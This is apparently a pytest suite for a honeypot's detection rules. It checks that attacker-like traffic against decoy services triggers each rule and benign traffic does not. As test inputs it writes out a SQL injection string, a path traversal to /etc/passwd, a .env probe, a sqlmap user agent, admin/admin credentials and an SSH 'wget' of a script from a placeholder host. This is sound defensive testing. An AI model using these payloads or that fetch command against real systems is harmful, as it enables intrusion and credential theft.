"""One test per rule: a case that fires and a case that does not, on events from the real decoys."""

from helpers import FIREFOX, api, banner_visits, finding_for, hits_of, run, web

from decoys import honeytokens
from qlure.correlate.engine import verdict_for
from qlure.correlate.model import RuleHit
from qlure.events import Service


def test_benign_browsing_and_one_mistyped_password(read_events):
    client = web()
    client.get("/")
    client.get("/login")
    client.post("/login", data={"username": "priya", "password": "Sp3cial!pw"})
    client.get("/robots.txt")
    finding = finding_for(run(read_events), "198.51.100.7", "web")
    assert finding.verdict == "Benign"
    assert finding.hits == []


def test_r2_path_enumeration(read_events):
    client = web("198.51.100.20")
    for i in range(16):
        client.get(f"/missing-{i}")
    quiet = web("198.51.100.21")
    for i in range(5):
        quiet.get(f"/missing-{i}")
    scanner_path = web("198.51.100.22")
    scanner_path.get("/wp-login.php")

    result = run(read_events)
    assert "R2" in hits_of(finding_for(result, "198.51.100.20", "web"))
    assert "R2" not in hits_of(finding_for(result, "198.51.100.21", "web"))
    assert "R2" in hits_of(finding_for(result, "198.51.100.22", "web"))


def test_r3_brute_force(read_events):
    many = web("198.51.100.30")
    for i in range(6):
        many.post("/login", data={"username": "ops", "password": f"guess-{i}"})
    names = web("198.51.100.31")
    for name in ("amy", "bob", "cho"):
        names.post("/login", data={"username": name, "password": "one-try-9"})
    few = web("198.51.100.32")
    for i in range(3):
        few.post("/login", data={"username": "ops", "password": f"guess-{i}"})

    result = run(read_events)
    assert "R3" in hits_of(finding_for(result, "198.51.100.30", "web"))
    assert "R3" in hits_of(finding_for(result, "198.51.100.31", "web"))
    assert "R3" not in hits_of(finding_for(result, "198.51.100.32", "web"))


def test_r4_default_credentials(read_events):
    web("198.51.100.40").post("/login", data={"username": "admin", "password": "admin"})
    web("198.51.100.41").post("/login", data={"username": "meera", "password": "T7!kq9zz"})
    result = run(read_events)
    assert "R4" in hits_of(finding_for(result, "198.51.100.40", "web"))
    assert "R4" not in hits_of(finding_for(result, "198.51.100.41", "web"))


def test_r5_injection_payload(read_events):
    web("198.51.100.50").get("/login?id=1' OR 1=1--")
    web("198.51.100.51").get("/login?next=%2Fadmin")
    web("198.51.100.52").get("/files?name=../../etc/passwd")
    result = run(read_events)
    assert "R5" in hits_of(finding_for(result, "198.51.100.50", "web"))
    assert "R5" not in hits_of(finding_for(result, "198.51.100.51", "web"))
    assert "R5" in hits_of(finding_for(result, "198.51.100.52", "web"))
    assert finding_for(result, "198.51.100.50", "web").verdict == "Suspicious"


def test_r6_scanner_tool_and_silent_banner_grab(read_events):
    web("198.51.100.60", agent="sqlmap/1.8.4#stable (https://sqlmap.org)").get("/login")
    web("198.51.100.61", agent=FIREFOX).get("/login")
    banner_visits("198.51.100.62", [Service.FTP])  # connects and sends nothing
    banner_visits("198.51.100.63", [Service.FTP], payload=b"USER anonymous\r\n")

    result = run(read_events)
    assert "R6" in hits_of(finding_for(result, "198.51.100.60", "web"))
    assert "R6" not in hits_of(finding_for(result, "198.51.100.61", "web"))
    assert "R6" in hits_of(finding_for(result, "198.51.100.62", "ftp"))
    assert "R6" not in hits_of(finding_for(result, "198.51.100.63", "ftp"))


def test_r7_one_planted_key_is_noteworthy_on_its_own(read_events):
    key = honeytokens.get("ht-api-001")["value"]
    api("198.51.100.70").get("/api/v1/users", headers={"X-API-Key": key})
    api("198.51.100.71").get("/api/v1/users", headers={"X-API-Key": "not-the-key"})
    result = run(read_events)
    used = finding_for(result, "198.51.100.70", "api")
    assert "R7" in hits_of(used)
    assert used.verdict == "Noteworthy"  # one request, yet the suppressor does not apply
    assert "R7" not in hits_of(finding_for(result, "198.51.100.71", "api"))


def test_r8_post_login_discovery(read_events):
    from helpers import ssh_with_honeytoken

    ssh_with_honeytoken("198.51.100.80", ["whoami", "id", "uname -a"])
    ssh_with_honeytoken("198.51.100.81", ["whoami", "id"])
    ssh_with_honeytoken("198.51.100.82", ["wget http://example.test/x.sh"])
    result = run(read_events)
    assert "R8" in hits_of(finding_for(result, "198.51.100.80", "ssh"))
    assert "R8" not in hits_of(finding_for(result, "198.51.100.81", "ssh"))
    assert "R8" in hits_of(finding_for(result, "198.51.100.82", "ssh"))


def test_r9_sensitive_file_access(read_events):
    web("198.51.100.90").get("/.env")
    web("198.51.100.91").get("/login")
    result = run(read_events)
    assert "R9" in hits_of(finding_for(result, "198.51.100.90", "web"))
    assert "R9" not in hits_of(finding_for(result, "198.51.100.91", "web"))


def test_r1_service_sweep(read_events):
    banner_visits("198.51.100.100", [Service.FTP, Service.MYSQL, Service.REDIS])
    banner_visits("198.51.100.101", [Service.FTP, Service.MYSQL])
    result = run(read_events)
    sweep = [f for f in result.findings if f.session.src_ip == "198.51.100.100"]
    assert all("R1" in hits_of(f) for f in sweep) and len(sweep) == 3
    quiet = [f for f in result.findings if f.session.src_ip == "198.51.100.101"]
    assert not any("R1" in hits_of(f) for f in quiet)


def test_one_recon_family_alone_is_held_at_suspicious():
    def hit(rule_id, weight):
        return RuleHit(rule_id, "x", "recon", weight, "medium", (), "m", "t", ())

    assert verdict_for(65, [hit("R1", 20), hit("R2", 25), hit("R6", 20)]) == "Suspicious"
    two_families = [hit("R2", 35), RuleHit("R3", "x", "credential", 30, "medium", (), "m", "t", ())]
    assert verdict_for(65, two_families) == "Noteworthy"
    assert verdict_for(29, []) == "Benign"
